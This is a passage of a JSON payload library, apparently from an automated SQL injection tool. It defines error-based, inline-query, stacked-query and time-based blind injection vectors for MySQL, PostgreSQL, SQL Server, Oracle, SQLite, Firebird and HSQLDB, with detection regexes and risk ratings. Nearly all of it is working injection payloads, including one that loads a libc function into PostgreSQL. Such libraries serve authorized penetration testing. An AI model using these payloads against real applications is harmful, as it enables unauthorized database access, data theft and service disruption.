(('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "risk": 2, "level": 3, "clause": [1], "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)", "request": {"payload": "OR [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [2], "vector": "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "risk": 2, "level": 2, "clause": [1], "title": "Oracle OR error-based - WHERE or HAVING clause (XMLType)", "request": {"payload": "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [2], "vector": "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 2, "level": 3, "clause": [1], "title": "Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)", "request": {"payload": "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle", "dbms_version": ">= 8.1.6"}}, {"where": [2], "vector": "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 2, "level": 4, "clause": [1], "title": "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "request": {"payload": "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [2], "vector": "OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 2, "level": 3, "clause": [1], "title": "Firebird OR error-based - WHERE or HAVING clause", "request": {"payload": "OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Firebird"}}, {"where": [3], "vector": "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "risk": 0, "level": 3, "clause": [1, 2, 3], "title": "MySQL >= 5.0 error-based - Parameter replace", "request": {"payload": "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [3], "vector": "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))", "risk": 0, "level": 3, "clause": [1, 2, 3], "title": "MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)", "request": {"payload": "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [3], "vector": "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))", "risk": 0, "level": 4, "clause": [1, 2, 3], "title": "MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)", "request": {"payload": "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1]))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [3], "vector": "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "risk": 0, "level": 5, "clause": [1, 2, 3], "title": "MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)", "request": {"payload": "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}, {"where": [3], "vector": "(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "risk": 0, "level": 3, "clause": [1, 2, 3], "title": "PostgreSQL error-based - Parameter replace", "request": {"payload": "(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "PostgreSQL"}}, {"where": [3], "vector": "(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", "risk": 0, "level": 3, "clause": [1, 3], "title": "Microsoft SQL Server/Sybase error-based - Parameter replace", "request": {"payload": "(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", "risk": 0, "level": 4, "clause": [1, 3], "title": "Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)", "request": {"payload": "(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "risk": 0, "level": 3, "clause": [1, 3], "title": "Oracle error-based - Parameter replace", "request": {"payload": "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))", "risk": 0, "level": 4, "clause": [1, 3], "title": "Firebird error-based - Parameter replace", "request": {"payload": "(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Firebird"}}, {"where": [1], "vector": ",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "risk": 0, "level": 3, "clause": [2, 3], "title": "MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [1], "vector": ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "risk": 0, "level": 3, "clause": [2, 3], "title": "MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)", "request": {"payload": ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "risk": 0, "level": 4, "clause": [2, 3], "title": "MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)", "request": {"payload": ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": ",(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "risk": 0, "level": 5, "clause": [2, 3], "title": "MySQL >= 5.5 error-based - GROUP BY and ORDER BY clauses (BIGINT UNSIGNED)", "request": {"payload": ",(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}, {"where": [1], "vector": ",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", "risk": 0, "level": 3, "clause": [2, 3], "title": "PostgreSQL error-based - GROUP BY and ORDER BY clauses", "request": {"payload": ",(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": ",(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", "risk": 0, "level": 3, "clause": [3], "title": "Microsoft SQL Server/Sybase error-based - ORDER BY clause", "request": {"payload": ",(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "risk": 0, "level": 3, "clause": [2, 3], "title": "Oracle error-based - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "risk": 1, "level": 1, "clause": [1, 2, 3, 8], "title": "MySQL inline queries", "request": {"payload": "(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')", "risk": 1, "level": 1, "clause": [1, 2, 3, 8], "title": "PostgreSQL inline queries", "request": {"payload": "(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": "PostgreSQL"}}, {"where": [3], "vector": "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", "risk": 1, "level": 1, "clause": [1, 2, 3, 8], "title": "Microsoft SQL Server/Sybase inline queries", "request": {"payload": "(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)", "risk": 1, "level": 1, "clause": [1, 2, 3, 8], "title": "Oracle inline queries", "request": {"payload": "(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'", "risk": 1, "level": 1, "clause": [1, 2, 3, 8], "title": "SQLite inline queries", "request": {"payload": "SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": "SQLite"}}, {"where": [3], "vector": "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE", "risk": 1, "level": 2, "clause": [1, 2, 3, 8], "title": "Firebird inline queries", "request": {"payload": "SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 6, "details": {"dbms": "Firebird"}}, {"where": [1], "vector": "; SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "risk": 0, "level": 1, "clause": [0], "title": "MySQL > 5.0.11 stacked queries", "request": {"comment": "-- ", "payload": "; SELECT SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "MySQL", "dbms_version": "> 5.0.11"}}, {"where": [1], "vector": "; SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "risk": 2, "level": 2, "clause": [0], "title": "MySQL < 5.0.12 stacked queries (heavy query)", "request": {"comment": "-- ", "payload": "; SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "stype": 4, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 0, "level": 1, "clause": [0], "title": "PostgreSQL > 8.1 stacked queries", "request": {"comment": "--", "payload": "; SELECT PG_SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [1], "vector": "; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "risk": 2, "level": 2, "clause": [0], "title": "PostgreSQL stacked queries (heavy query)", "request": {"comment": "--", "payload": "; SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)"}, "response": {"time": "[DELAYED]"}, "stype": 4, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": "; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 0, "level": 4, "clause": [0], "title": "PostgreSQL < 8.2 stacked queries (Glibc)", "request": {"comment": "--", "payload": "; CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "PostgreSQL", "os": "Linux", "dbms_version": "< 8.2"}}, {"where": [1], "vector": "; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "risk": 0, "level": 1, "clause": [0], "title": "Microsoft SQL Server/Sybase stacked queries", "request": {"comment": "--", "payload": "; WAITFOR DELAY '0:0:[SLEEPTIME]'"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "; SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL", "risk": 0, "level": 5, "clause": [0], "title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)", "request": {"comment": "--", "payload": "; SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "; SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL", "risk": 2, "level": 5, "clause": [0], "title": "Oracle stacked queries (heavy query)", "request": {"comment": "--", "payload": "; SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5"}, "response": {"time": "[DELAYED]"}, "stype": 4, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END", "risk": 0, "level": 5, "clause": [0], "title": "Oracle stacked queries (DBMS_LOCK.SLEEP)", "request": {"comment": "--", "payload": "; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "; BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END", "risk": 0, "level": 5, "clause": [0], "title": "Oracle stacked queries (USER_LOCK.SLEEP)", "request": {"comment": "--", "payload": "; BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "; SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "risk": 2, "level": 3, "clause": [0], "title": "SQLite > 2.0 stacked queries (heavy query)", "request": {"comment": "--", "payload": "; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "stype": 4, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE", "risk": 2, "level": 3, "clause": [0], "title": "Firebird stacked queries (heavy query)", "request": {"comment": "--", "payload": "; SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4"}, "response": {"time": "[DELAYED]"}, "stype": 4, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}, {"where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END", "risk": 0, "level": 3, "clause": [0], "title": "HSQLDB >= 1.7.2 stacked queries", "request": {"comment": "--", "payload": ";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END", "risk": 0, "level": 4, "clause": [0], "title": "HSQLDB >= 2.0 stacked queries", "request": {"comment": "--", "payload": ";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 4, "details": {"dbms": "HSQLDB", "dbms_version": ">= 2.0"}}, {"where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "risk": 1, "level": 1, "clause": [1, 2, 3], "title": "MySQL > 5.0.11 AND time-based blind", "request": {"payload": "AND SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL", "dbms_version": "> 5.0.11"}}, {"where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "risk": 1, "level": 4, "clause": [1, 2, 3], "title": "MySQL > 5.0.11 AND time-based blind (comment)", "request": {"comment": "#", "payload": "AND SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL", "dbms_version": "> 5.0.11"}}, {"where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "risk": 2, "level": 2, "clause": [1, 2, 3], "title": "MySQL < 5.0.12 AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "MySQL < 5.0.12 AND time-based blind (heavy query - comment)", "request": {"comment": "#", "payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 1, "level": 1, "clause": [1, 2, 3], "title": "PostgreSQL > 8.1 AND time-based blind", "request": {"payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "risk": 1, "level": 5, "clause": [1, 2, 3], "title": "PostgreSQL > 8.1 AND time-based blind (comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "risk": 2, "level": 3, "clause": [1, 2, 3], "title": "PostgreSQL AND time-based blind (heavy query)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "PostgreSQL AND time-based blind (heavy query - comment)", "request": {"comment": "--", "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "risk": 0, "level": 1, "clause": [0], "title": "Microsoft SQL Server/Sybase time-based blind", "request": {"comment": "--", "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "risk": 2, "level": 2, "clause": [1, 2, 3], "title": "Microsoft SQL Server/Sybase AND time-based blind (heavy query)", "request": {"payload": "AND 